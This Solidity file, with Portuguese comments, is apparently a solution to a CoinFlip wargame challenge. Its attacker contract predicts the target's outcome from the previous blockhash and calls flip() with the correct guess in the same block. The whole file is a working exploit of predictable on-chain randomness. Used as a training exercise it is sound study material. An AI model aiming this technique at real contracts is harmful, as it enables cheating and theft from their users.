// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        // Replicamos exatamente a lógica do contrato original
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Como calculamos o resultado no mesmo bloco, vamos acertar
        target.flip(side);
    }
}